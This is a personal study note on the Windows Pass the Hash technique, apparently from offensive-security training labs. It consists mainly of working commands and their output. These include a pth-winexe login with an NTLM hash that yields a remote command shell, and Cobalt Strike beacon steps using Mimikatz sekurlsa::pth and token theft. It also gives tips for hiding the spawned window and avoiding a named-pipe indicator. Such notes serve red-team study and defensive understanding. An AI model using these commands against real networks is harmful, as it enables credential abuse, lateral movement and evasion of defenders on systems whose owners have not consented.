---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---
pth
Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Pass the Hash]]  
___

## Description:  

### From Kali

```
kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd


E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.16299.309]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\Windows\system32>

```

### In CobaltStrike


Pass the Hash is a technique that allows you to authenticate to a Windows service using the NTLM hash of a user's password, rather than the plaintext.

```
beacon> pth DEV\jking 4ffd3eabdce2e158d923ddec72de979e

user    : jking
domain    : DEV
program    : C:\Windows\system32\cmd.exe /c echo 1cbe909fe8a > \\.\pipe\16ca6d
impers.    : no
NTLM    : 4ffd3eabdce2e158d923ddec72de979e
  |  PID  5540
  |  TID  5976
[...snip...]

beacon> ls \\srv-2\c$

```

To avoid the `\\.\pipe\` indicator, we can execute Mimikatz manually and specify our own process.

```
beacon> mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /ntlm:4ffd3eabdce2e158d923ddec72de979e

user    : jking
domain    : dev.cyberbotic.io
program    : cmd.exe
impers.    : no
NTLM    : 4ffd3eabdce2e158d923ddec72de979e
  |  PID  6284
  |  TID  6288


```

If no `/run` parameter is specified, then `cmd.exe` is started.  However, this can actually cause the process window to appear on the users desktop.

Use a process that doesn't have a console or use `"powershell -w hidden"` to create a hidden window.

Then once the spawned process has started, impersonate it using `steal_token`.

```
beacon> steal_token 6284
[+] Impersonated NT AUTHORITY\SYSTEM
```

When finished, use `rev2self` and `kill` the spawned process.
```
beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 8 bytes

beacon> kill 6284
[*] Tasked beacon to kill 6284
[+] host called home, sent: 12 bytes

```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (05:57 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
